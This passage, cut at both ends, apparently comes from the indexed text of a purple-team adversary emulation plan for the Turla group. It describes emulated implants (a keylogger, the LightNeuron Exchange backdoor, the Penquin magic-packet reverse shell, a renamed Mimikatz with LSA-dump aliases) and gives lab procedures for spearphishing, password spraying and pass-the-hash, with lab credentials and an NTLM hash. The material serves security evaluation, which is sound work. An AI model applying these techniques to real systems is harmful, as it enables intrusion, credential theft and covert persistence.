keylogger as part of a service or outside of the active session, use the -r switch to have it automatically restart in an active session:","To terminate, you will need to terminate any keylogger processes either via Task Manager or command prompt / PowerShell."]},{"i":"example-keylogger-output","l":"Example Keylogger Output:"},{"l":"CTI Notes","p":["Keystrokes are logged to %temp%\\~DFA512.tmp(name changed from %TEMP%\\~DFD3O8.tmp in CTI)","Keystrokes are using a hook on WH_KEYBOARD_LL","WM_KEYDOWN, WM_KEYUP, and WM_SYSKEYDOWN are the intercepted procedures","When the EXE loads it creats a session header that includes the hostname","Current foreground window is checked every 100ms. Window changes are logged as [%Window Process File Path%: %Window Title%]"]},{"i":"cti-references","l":"CTI References:","p":["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://securelist.com/the-epic-turla-operation/65545/"]},{"l":"Compiling the Binaries"},{"l":"MINGW64","p":["Using mingw64 on Windows or Kali Linux (adjust backslashes if on Linux):","To set up mingw64 on Windows, msys2 was installed and used:- choco install msys2- Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.- Run msys2 and within the new prompt, run the following:- pacman -Syu- pacman -S --needed base-devel mingw-w64-x86_64-toolchain"]},{"l":"Visual Studio 2019","p":["On a machine with Visual Studio 2019 installed, run the following to clean and build x64 release versions of the keylogger EXE:"]}],[{"l":"LightNeuron","p":["LightNeuron is broken up into the following components:| Component | Description || --- | --- || Transport Agent | Microsoft transport agent || Companion DLL | Malicious companion code || PowerShell Install Script | Installs the transport agent || Configuration File | Configuration of companion DLL C2 communications || Rule File | Configuration of LightNeuron's email processing behavior |"]},{"l":"Build Instructions"},{"l":"Transport Agent","p":["Run the following to recompile the transport agent DLL from the Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory:","NOTE: if compiling in a different directory than the original project directory, the Microsoft.Exchange.Data.Common.dll and Microsoft.Exchange.Data.Transport.dll must be located in the directory where the command is being executed. These binaries can be copied from an installed version of Exchange."]},{"l":"Companion DLL","p":[".\\vcpkg\\bootstrap-vcpkg.bat","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","C:\\Program Files\\CMake\\bin or equivalent CMake bin folder","C:\\tools\\msys64\\mingw64\\bin or equivalent Mingw-w64 bin folder","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","choco install msys2","Download the repository to C:\\vcpkg","Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).","git clone https://github.com/Microsoft/vcpkg.git","If cmake was already installed but is not in your path, add it to your path manually (e.g. C:\\Program Files\\CMake\\bin)","Install vcpkg onto your system","Make sure CMake is installed on your machine","Make sure mingw64 is installed on your machine. In this particular example, msys2 was installed and used to install mingw64.","pacman -S --needed base-devel mingw-w64-x86_64-toolchain","pacman -Syu","Paths to folders containing gcc and g++ compilers if not already included in the above Mingw-w64 path folder.","Reopen console windows to register the new env variables.","Run msys2 and within the new prompt, run the following:","Run the following to compile the Companion dll for use by the transport agent. File was originally compiled on Windows 10","You will need to restart the shell to use cmake."]},{"l":"Test Instructions"},{"l":"Test Instructions for Transport Agent","p":["Tests were run from a Windows machine using PowerShell and will interact with the Exchange server provided as an argument to the script. The Windows host should be able to resolve the Exchange server's hostname properly.","These tests will copy the transport agent DLL and TestIngestStruct DLL, install the transport agent, test functionality by sending emails, checking DLL log files, and checking inboxes, then uninstall the transport agent and remove all files.","NOTE: This test script is dependent on Microsoft.Exchange.WebServices.dll. This binary can be copied from an installed version of Exchange and should be placed in the same directory where the test script is being executed from.","Ensure the transport agent is built using the above command and the DLL is located in the TransportAgent\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory","Ensure the Microsoft.Exchange.WebServices.dll is located within the Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests directory. If not, this DLL can be downloaded from the binaries available in an installed Exchange server.","Change directory into the Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests directory:","Run the PowerShell script testing transport agent functionality:"]},{"l":"Test Instructions for Companion DLL","p":["Unit tests were run on a Windows machine using CMake. Running this will also build the script in the CompanionDLL\\util directory.","Set up and run tests via Powershell from the Companion DLL Directory to check:"]},{"l":"Test Instructions for Full Implant Testing","p":["Open an admin PowerShell in the LightNeuron directory","Run the following to install all components of LightNeuron:","This will copy over the rule file, configuration file, Companion DLL (from the CompanionDLL/data directory), and the transport agent Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll(from the TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory).","Once the setup script has finished executing, you may begin sending emails that will be collected by LightNeuron as indicated by its rule file","To tear down the full implant testing, run the following from the same admin PowerShell terminal from earlier (or open a new admin PowerShell) to delete all artifacts:"]},{"l":"Usage Examples"},{"i":"transport-agent-1","l":"Transport Agent","p":["Copy the Transport Agent DLL to the Exchange server at: C:\\Program Files\\Microsoft\\Exchange Server\\v15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll.","For testing with the TestIngestStruct, copy the TestIngestStruct.dll to the same directory as the Transport Agent DLL.","Copy msita.ps1 to the Exchange Server and execute from an Admin PowerShell.","Sending emails between users should now be logged in the LightNeuron log file. The TestIngestStruct DLL will also log email data of the most recent email received at the file: C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows\\TestIngestDebug"]},{"l":"Analyzing a Test Image","p":["Under CompanionDLL\\util an executable is included to use the steganography portion of the Companion DLL without needing to use the rest of the implant. This is useful for verifying that returned images being sent to the implant contain the expected result.","Note: The current implementation will encrypt the resulting command output before embedding it in the output file, so if you open the image in a hex editor it will still look like random data."]},{"l":"Using the Executable","p":["Building the Executable","Follow the same steps as building the unit tests.","When running the build command, it will automatically rebuild the analyze_image.exe binary.","Generate the image using the C2 server","Run the C2 server like normal, then call the lightneuron handler with whatever command you want to test.","Even without being able to send the image, a snake_modified.jpg image will be generated, this is the image to use for testing.","Note: Encryption must be enabled for this image to work with the implant. To enable encryption on the C2 server, set the encryption flag to true in the implant config.","Note: Take note of the signature key that is used when generating the image, it will be needed to run this utility script. The key is hardcoded into the C2 server handler, it's currently set to: pwndsnek","Run the Executable","Copy the snake_modified.jpg image to the same folder as the executable.","Run the executable with the path to the image and signature key.","Using default filename and key from C2 server:","If successful, the resulting image will be written to: output.jpg","This image can now be dropped in the pickup folder of the C2 server to be analyzed and see the result."]},{"l":"Cleanup Instructions"},{"l":"Removing installed transport agents"},{"l":"Manually cleaning files from the Exchange Server","p":["Open and run Exchange Management Shell as Administrator. Execute the following:","Remove the LightNeuron log file:","If using the TestIngestStruct, remove the debug file:"]},{"l":"Automated cleanup","p":["Please see the LightNeuron in the Resources/cleanup directory"]},{"l":"Misc"},{"i":"msiexps1","l":"msiex.ps1","p":["Install Microsoft Exchange Transport Agent","CTI indicates PowerShell installer script file name was msinp.ps1. This has been tweaked to msiex.ps1 instead."]},{"l":"CTI Evidence","p":["https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"]},{"l":"References","p":["https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-an-smtpreceiveagent-transport-agent-for-exchange-2013","https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-a-routingagent-transport-agent-for-exchange-2013","https://stackoverflow.com/a/13935718","https://github.com/ReneNyffenegger/cpp-base64","https://github.com/zeux/pugixml"]}],[{"l":"Penquin","p":["Penquin is a backdoor for re-activating access to servers over long term engagements. Penquin installs a BPF filter, mimicing cron, to listen on a servers network interface. When turla sends an activation packet to the targeted host, a reverse shell is activated.","Penquin is broken into the following components:| Component | Description || --- | --- || sniff.c | Executes cron as a child process while deploying a BPF network sniffer that waits for a matching packet. Once the matching packet it recieved, a reverse shell is executed. The reverse shell was based on the common usage of this method captured in the ExaTrack Report|| cron.h | A header file containing the byte array of the compiled sniff.c program (generated using the build script ( build_Penquin.sh) || main.c | Writes Penquin to disk, then installs and executes Penquin masquerading as cron || sendPacket.py | Sends an activation packet to a targeted host || crypt.h | Obfuscates strings (max 64 char) at compile time - Deobfuscates strings at runtime |"]},{"i":"usage-example---manual-execution","l":"Usage Example - Manual Execution","p":["This assumes you are running as root on the target Ubuntu system.","From the /root/ folder, execute penquin. Total time 8 seconds to execute. There is no expected terminal output.","Remove penquin from disk."]},{"l":"Execution checks","p":["Verify cron is running cron. /usr/bin/cron -f is our evil cron, usr/sbin/cron -f is real cron.","Results should look like...","Based on the Leonardo Report and Presentation, Penquin deploys a legitimate version of the Linux utility cron and executes cron as a child process of Penquin. However, reporting was unclear on the series of events between Penquin’s initial execution and the execution of cron. To address this gap, Red Team developers hypothesized the below process tree was the objective of deploying cron, Masquerading Penquin as real cron. In order to provide this process tree, we leveraged the Create or Modify System Process: Systemd Service technique to execute Penquin.","Target Process Tree","Verify the socket is actively listening.","p_raw is where our evil cron is listening."]},{"i":"activation-packet-aka-magic-packet","l":"Activation Packet (AKA Magic Packet)"},{"l":"On Attacker Host","p":["These steps assume sniff.c(compiled) is already running on the victim host. On the attacker host, start a listener and execute this script. This script sends a crafted packet to the victim host activating a reverse shell connecting to the listener.","Install all requirements","In a terminal window, set up a netcat listener. Using 8081 ensures we are not conflicting with other listeners in this scenario.","Open a second terminal window and navigate to the /turla/Resources/Penquin directory. Execute the sendPacket.py script. Update IPs/ports as needed - Penquin currently sniffs on all ports on the victim machine for the magic packet. Port 8080 is used based on Lab52's report.","You will see the packet info in the terminal screen + the hexdump of the packet. The terminal output Sent 1 packets confirms the packet was successfully sent.","Check the terminal window with the netcat listener, the reverse shell should be running inside the victim's /root directory.","Make sure that the ipaddress inside the python file is correct. The default configuration will trigger the reverse shell to localhost (127.0.0.1) on port 6792. This can be changed by specifying a custom hander IP address using --handler_ip IP Address and the port can be changed using --handler_port port. The target where the penguin implant resides can be set using --target_ip IP Address and the port can be adjusted using --target_port port.","The penguin implant currently only supports plain text base64 encoded payloads. This can be set in the packet generator using --payload_type base64 alternatively, an AES encrypted payload can be sent using --payload_type aes."]},{"l":"Build Instructions"},{"l":"Requirements","p":["-lpcap= is used to statically link the lpcap library - this is consistent with CTI reporting in the Leonardo Report.","-o= names the output file (default is a.out)","-O3= optimizes the code","-s= gcc's version of the strip command","Add extern to variables contained in the header file","Binary is now ready for deployment in operations. Continue to next section if only testing execution locally.","build-essential","compile penquin program with the header file containing the sniffer binary","Compile the sniffer into a binary","Context on cron utility usage: Based on reference article.","Convert the sniffer binary into a header file using xxd","Ensure the GCC version is compatible between build host & victim host","Execute the build script ( build_Penquin.sh).","libpcap-dev","Navigate to the /Resources/Penquin/ folder","Results should look like the following:","Summary of Build Process","The following must be installed on the Ubuntu dev host:","Verify the build_Penquin.sh exists in the folder with executable permissions.","Verify the Penquin binary is present. The binary location is provided in the last line of the terminal output."]},{"l":"Testing","p":["This assumes the build script ( build_Penquin.sh) has been executed with the resulting binaries in the folder. Summary of testing process","Moves penquin to /root/ folder","Executes penquin","Verifies penquin was executed as expected","Requires sudo privileges to execute","Navigate to the /Resources/Penquin/ folder","Verify the execution_penquin_test.sh exists in the folder with executable permissions.","Run the following command on the victim host","Results should look like the following:"]},{"l":"Cleanup Instructions","p":["Summary of clean up process:","Removes all files dropped to disk","Kills all processes associated with our cron service in /usr/bin/","Reloads the cron service back to it's original state operating from /usr/sbin","Requires sudo privileges","Navigate to the /Resources/cleanup/Penquin/ folder","Verify the cleanup_penquin.sh exists in the folder with executable permissions.","With sudo, Execute the following command in the /Resources/cleanup/Penquin/ folder.","Expected output```bash Destroying all the Penquins..."]},{"l":"Misc"},{"l":"CTI Evidence","p":["Leonardo Report","Other projects (cd00r.c & LOKI2) referenced in the Kaspersky - Penquins Moonlit Maze Report","Leonardo Presentation","cd00r.c","LOKI2 - Phrack Volume 7, Issue 51 and github code from JeremyNGalloway","Activation Packet Lab52"]},{"l":"References","p":["Filter uses reference code from DevDungeon","Stuart McMurray - Offensive pcap presentation","C string obfuscation crypt.h - BroOfBros"]},{"l":"Troubleshooting","p":["Identify all processes associated with our evilcron, note the process group number in the list, it should be the same for most of them.","Kill the process group for cron. Copy/Paste the process group id (3rd column of numbers from left to right) in place of the PGID placeholder in the below command. After executing, the entire process tree should be killed. Verify with ps -efj | grep cron command or ps -Hlwwfe. :ax: (i.e. kill -- -252557)","Use the below command to check the status of cron. If the status blurb is the same as below, penquin is NOT running.","The status message should resemble the below blurb:"]}],[{"l":"Updates to the Mimikatz bin","p":["The original mimikatz version used can be found at: https://github.com/gentilkiwi/mimikatz","Modifications:","Mimikatz was renamed to DvKGMmGn.exe","Renamed all common files/functions.","Removed descriptive strings, and other strings as seen.","Stripped out unused functionality","Changed icon"]},{"l":"Command Changes","p":["privilege::debug is now pr::d","sekurlsa- slsa","lsadump- lsdu","logonpasswords- lop","privilege- pr","token- mrio","elevate- 1up","pass the hash is now called with slsa::htp","logonpasswords is called with slsa::lop","lsadump::lsa is now lsdu::go(/inject is now /ynot) (/patch is now /pooch)","exit was changed to quit"]},{"l":"Custom PSExec Commands","p":["Adding /remotepc:pcname to pass-the-hash is the first argument to initiate psexec and is always required. (you do not need to add backslashes \\\\)","The path to psexec is always required: /pexe:C:\\Path\\to\\PSExec.exe","If you want to execute psexec's -c command then you use: /prun:c:\\path\\to\\executable.exe","Output console text to a file: /out:C:\\outfile.txt(adds c:\\outfile.txt to the psexec command)","Use /sys:1 to add psexec -s(run as system).","Full mimikatz command executing psexec -c:","Resulting command created/executed by mimikatz:"]},{"i":"executing-example-commands","l":"Executing example commands:","p":["Executing an LSA Dump: mimikatz.exe privilege::d lsdu::go /ynot"]},{"l":"Adjustments made to mimikatz PTH function","p":["The pass-the-hash function was modified to accept additional arguments since mimikatz PTH did not allow for arguments as a part of the PTH command."]}],[{"l":"Turla Emulation Plans","p":["An emulation plan is the primary document used to execute the red team scenario during a purple team operation. This document includes red team execution commands, links to source code, ATT&CK techniques leveraged, and CTI reporting references.","When we have multiple emulation plans, we break these plans into scenarios and provide a description of the plan's focus.","Emulation Plan","CTI Operations Flow","Description","Carbon Scenario","Carbon Operations Flow","This directory contains the scenarios developed focusing on Turla's usage of Carbon. This plan was used to conduct ATT&CK Evaluations Enterprise Round 5 in 2023","Snake Scenario","Snake Operations Flow","This directory contains the scenarios developed focusing on Turla's usage of Snake. This plan was used to conduct ATT&CK Evaluations Enterprise Round 5 in 2023.","Caldera Support Files","This directory contains the setup instructions and data for porting the above scenarios into Caldera"]}],[{"l":"Carbon Scenario","p":["For ATT&CK Evaluations Enterprise Round 5, the Carbon scenario was developed to emulate Turla's utilization of the following software:","Epic","Carbon","PsExec","Mimikatz","Keylogger","Penquin"]},{"l":"Detections Scenario","p":["This 10 step scenario was created for the Detections portion of ATT&CK Evaluations Enterprise Round 5, where all prevention mechanisms and protection tooling is disabled to allow the full emulation plan to execute unobstructed. This allows the scenario to be executed from beginning to end, with each step building upon the previous. and for telemetry on red team activity to be gathered in full."]},{"l":"Protections Scenario","p":["The scenario created for the Detections portion was modularized into 7 discrete tests to create the Protections portion of ATT&CK Evaluations Enterprise Round 5, where prevention mechanisms and protection tooling is enabled. This highlights protection capabilities of the deployed solution and encourages blocks of red team activity as early as possible. For this reason, this version of the scenario was designed to removes the dependencies between each step."]},{"l":"Infrastructure","p":["This scenario was executed on the following infrastructure:","Carbon Infrastructure Diagram","Reference setup for guidance on deploying the infrastructure used by this scenario."]}],[{"l":"Carbon Protections Scenario","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","❗ - extremely important note","➡️ - Switching to another session","⭕ - Sign out of something"]},{"l":"Protections Setup","p":["➡️ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, and start the control server:","Within your Kali control server terminal window, right click and select\"Split Terminal Horizontally\". Be careful not to terminate the control server.","In the new terminal window, change directory to the control server repo:","Ensure that the Carbon and EPIC handlers started up."]},{"i":"test-1-initial-access-via-spearphishing-link","l":"Test 1: Initial Access via Spearphishing Link","p":["\uD83C\uDFA4 Voice Track:","Test 1 emulates Turla gaining initial access via a spearphishing link sent in an email to the user Gunter.","The link initiates the download of a fake software update executable named NTFVersion.exe."]},{"i":"biohazard-procedures","l":":biohazard: Procedures","p":["➡️ RDP to hobgoblin (10.20.20.102) as Gunter:","Username","Password","skt\\Gunter","Password1!","Open Microsoft Edge, declining all first-run options, and browse to https://brieftragerin.skt.local/owa. Login:","Open the email from noreply@sktlocal.it and click the link in the email to initiate the download of NTFVersion.exe. ❗ DO NOT EXECUTE THE FILE.","Open File Explorer and browse to Downloads"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["EPIC Dropper","File write of EPIC injector as mxs_installer.exe","Registry modification"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf"]},{"i":"test-2-epic-and-carbon-on-workstation","l":"Test 2: EPIC and Carbon on Workstation","p":["\uD83C\uDFA4 Voice Track:","Test 2 emulates user execution of the EPIC dropper, execution of the EPIC injector via the Winlogon shell registry key value, and execution of the Carbon installer."]},{"i":"biohazard-procedures-1","l":":biohazard: Procedures","p":["❗ Verify that the ViperVPNSvc service shows up in the tasklist output towards the end.","➡️ Minimize (do not close) the hobgoblin RDP window.","➡️ Open up a new terminal tab in your Kali machine using Ctrl+Shift+T, name this tab \"smbclient\" and copy the EPIC injector to the Windows host hobgoblin:","➡️ RDP into bannik (10.20.10.9), as Frieda:","➡️ Re-RDP to hobgoblin (10.20.20.102) as Gunter:","➡️ Return to your RDP to hobgoblin. Open File Explorer and browse to Gunter's Downloads folder.","➡️ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","➡️ Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:","➡️ Switch to your Kali attack station and confirm that a new elevated implant has registered.","⭕ Wait 1 minute then close out of all tabs and sign out of the RDP session to hobgoblin as Gunter.","CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered with the C2 server","Close any spurious windows.","Double click and run NTFVersion.exe","ℹ️ Starting the ViperVPN service should take at least 30 seconds and eventually result in an error [SC] StartService FAILED 1053. The EPIC injector will wait an additional 2 minutes before performing injection. If the [SC] StartService FAILED 1053 error occurs in less than 10 seconds and/or you don't receive a new session, contact your Evals lead.","In your lower terminal tab, copy and paste the first set of discovery commands:","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge.","Open Microsoft Edge and browse to https://brieftragerin.skt.local/owa.","Open up an administrative Powershell session and run the following commands to remotely restart the service:","Password","Password1!","Password3!","skt\\Frieda","skt\\Gunter","This should return:","Username","Wait for the command to return and then ⭕ sign out of your RDP session to bannik as Frieda","Wait for the command to return and then task the Carbon implant to execute some discovery commands:","Wait for the command to return and then task the EPIC implant to execute the CARBON-DLL installer:","Wait for the command to return before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:","Wait for the command to return before tasking the next command to query the service and who can access it:","Wait for the command to return.","Within your Kali control server terminal window, right click and select \"Split Terminal Horizontally\". Be careful not to terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","Beacon and task retrieval over HTTP","bzip2 compressed","C2 communications are:","CARBON-DLL Comms Lib","CARBON-DLL installer","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Create Loader Service","Directory discovery DirectoryDiscovery","Drop components","EPIC Dropper","EPIC Guard","EPIC injector","EPIC Payload","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","File download DownloadFile","File write of EPIC injector as mxs_installer.exe","Loader Service","Registry modification","RSA encrypted AES key","Service registry edits: 1, 2","Start Loader Service","Targeting browser processes for DLL injection","Targeting explorer.exe for DLL injection","Task Execution","Upload task output over HTTP","User discovery GetAllUsers","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"test-3-password-spray","l":"Test 3: Password Spray","p":["\uD83C\uDFA4 Voice Track:","Test 3 emulates Turla laterally moving to the domain controller by conducting password spraying via a batch script to retrieve a domain admin's credentials to the domain controller. The batch script sprays several of the discovered domain admin accounts with weak passwords, one of which successfully mounts the C:\\ drive of the domain controller."]},{"i":"biohazard-procedures-2","l":":biohazard: Procedures","p":["➡️ From the \"smbclient\" tab on the Kali Linux machine, copy the password spray script to hobgoblin:","➡️ Return to your RDP session to hobgoblin as Gunter.","➡️ Open a Windows Command Prompt and execute the password spray script.","❗ Verify that the script successfully sprays Frieda's password by checking that output matches the following:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Password spray batch script"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/"]},{"i":"test-4-carbon-on-domain-controller","l":"Test 4: Carbon on Domain Controller","p":["\uD83C\uDFA4 Voice Track:","Test 4 emulates execution of CARBON-DLL on the domain controller via scheduled task."]},{"i":"biohazard-procedures-3","l":":biohazard: Procedures","p":["❗ Verify that \\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator task appears in the output.","➡️ From the \"smbclient\" tab on the Kali Linux machine, copy the Carbon installer executable to Windows host, hobgoblin.","➡️ In your RDP session to bannik (10.20.10.9), open File Explorer and browse to C:\\Windows\\System32. Order the files by date.","➡️ Minimize the RDP session to hobgoblin and start a new RDP session to bannik (10.20.10.9) as Frieda:","➡️ Return to your RDP session to bannik.","➡️ Return to your RDP session to hobgoblin (10.20.20.102) and from the Admin Command Prompt, copy the 2nd Carbon installer to bannik (10.20.10.9):","➡️ Return to your RDP session to hobgoblin (10.20.20.102) as Gunter.","➡️ Return to your RDP session to hobgoblin (10.20.20.102).","From the Admin Command Prompt, execute the following to enumerate schtasks on the domain controller:","In the Command Prompt, press CTRL+F and in the \"Find what:\" field, enter Customer Experience Improvement Program","Open an Admin Command Prompt. Use the following credentials if prompted:","Open File Explorer and browse to C:\\Program Files\\Windows NT\\2028. Validate the existence of a dsntport.dat file. The log file should be growing every~ 20 seconds.","Open File Explorer and browse to C:\\Windows\\System32. Order the files by date.","Open Microsoft Edge.","Password","Password3!","skt\\frieda","The output should contain:","Username","Wait for the command to return and then modify a scheduled task using the discovered password for the domain admin Frieda( https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a).","Wait for the command to return and then start the modified scheduled task on the domain controller."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"test-5-mimikatz-and-psexec-of-3rd-carbon-installer","l":"Test 5: Mimikatz and PsExec of 3rd Carbon Installer","p":["\uD83C\uDFA4 Voice Track:","Test 5 emulates Turla downloading and executing Mimikatz as terabox.exe in order to perform lateral movement to a second workstation in the domain."]},{"i":"biohazard-procedures-4","l":":biohazard: Procedures","p":["❗ Verify that a new Carbon implant has been registered with the control server.","❗ Verify that the NTLM hash for adalwolfa is included in the output.","➡️ From the \"smbclient\" tab on the Kali Linux machine, copy over Mimikatz to bannik (10.20.10.9):","➡️ From the \"smbclient\" tab on the Kali Linux machine, copy over PsExec and the 3rd Carbon installer to bannik (10.20.10.9):","➡️ Minimize (do not close) the khabibulin (10.20.20.104) RDP window and return to the RDP session to bannik (10.20.10.9).","➡️ Minimize (do not close) the RDP window. Start a new RDP session to khabibulin (10.20.20.104) as adalwolfa:","➡️ Return to your RDP session to bannik (10.20.10.9) as Frieda.","Close any spurious windows","From the existing elevated Windows Command Prompt, execute Mimikatz Pass-the-Hash with PsExec to execute the 3rd Carbon installer on khabibulin (10.20.20.104):","In the Command Prompt, press CTRL+F and in the \"Find what:\" field, enter NTLM : 07d128430a6338f8d537f6b3ae1dc136","NOTE: This command varies slightly from the Detections scenario with the addition of privilege::debug since we are not executing from SYSTEM context.","Open an elevated Windows Command Prompt and execute the following command to dump LSASS:","Open File Explorer and browse to C:\\Windows\\System32. Order the files by date.","Open up Edge, but don't browse to any website just yet. The browser process is needed for Carbon comms lib DLL injection to occur.","Password","Password2!","Return to the File Explorer window in System32.","skt\\adalwolfa","The output should contain:","Username"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Mimikatz","CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 4: SwissCERT - RUAG Report","Report 9: Symantec - Waterbug New Toolset","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/"]},{"i":"test-6-keylogger","l":"Test 6: Keylogger","p":["\uD83C\uDFA4 Voice Track:","Test 6 emulates Turla installing a custom keylogger ( wingtsvcupdt.exe) on Adalwolfa's workstation and harvesting credentials from the system."]},{"i":"biohazard-procedures-5","l":":biohazard: Procedures","p":["❗ Type in full, do not copy or autocomplete, http://kagarov/index.html into the address bar and press enter.","❗ Verify that the keystrokes were logged containing the website information and Adalwolfa's SSH credentials.","➡️ From the \"smbclient\" tab on the Kali Linux machine, copy over the keylogger to khabibulin (10.20.20.104):","➡️ Return to your RDP session to khabibulin (10.20.20.104) as adalwolfa.","➡️ Start a new RDP session to khabibulin (10.20.20.104) as adalwolfa(if no existing RDP from a previous test):","Execute the following command to output the data written to the keylogger file:","From the elevated Windows Command Prompt, CTRL + C to kill the keylogger","Go to line 198 with CTRL + SHIFT + - then type 198","Minimize the elevated Windows Command Prompt","NOTE: This should hang the terminal with the following output:","Open a new non-admin PowerShell terminal","Open an elevated Windows Command Prompt and execute the following command to start the keylogger:","Open Edge.","Password","Password2!","Replace Apache2 Ubuntu Default Page with Adalwolfa's Page","save the file with CTRL + X, Y, enter","Simulate activity as Adalwolfa:","skt\\adalwolfa","sudo nano /var/www/html/index.html","Type do not copy the SSH command: ssh adalwolfa@10.20.10.23","Type do not copy the SSH password Password2! when prompted.","Type exit to exit from the SSH session","Username","Within the SSH session, type do not copy the follow commands as Adalwolfa:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Keylogger","Current hostname discovery","Token manipulation and session discovery to restart in active session","Keylogging hook routine","Set keylogging hook","Active window discovery"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://blog.talosintelligence.com/2021/09/tinyturla.html","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"]},{"i":"test-7-penquin","l":"Test 7: Penquin","p":["\uD83C\uDFA4 Voice Track:","Test 7 emulates Turla laterally moving to the Linux Apache server and installing Penquin. Once Penquin's sniffer has been installed, a magic packet is sent to the Apache server, from which the sniffer component of Penquin parses the IP address to connect to, and triggers the establishment of a reverse shell."]},{"i":"biohazard-procedures-6","l":":biohazard: Procedures","p":["➡️ From the \"smbclient\" tab on the Kali Linux 